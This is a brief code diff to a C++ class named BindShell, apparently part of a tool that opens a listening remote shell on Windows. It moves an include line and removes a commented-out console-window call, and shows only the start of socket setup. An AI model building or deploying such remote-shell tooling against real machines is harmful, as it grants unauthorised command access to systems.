@@ -1,7 +1,6 @@
+#include <WS2tcpip.h>
 
 #include "BindShell.h"
-
-#include <WS2tcpip.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -17,7 +16,6 @@ BindShell::~BindShell()
 
 int BindShell::Run(unsigned short port)
 {
-	//HWND hWnd = GetConsoleWindow();
 	WSADATA WSAData;
 	SOCKADDR_IN sin;
 	SOCKET sock;
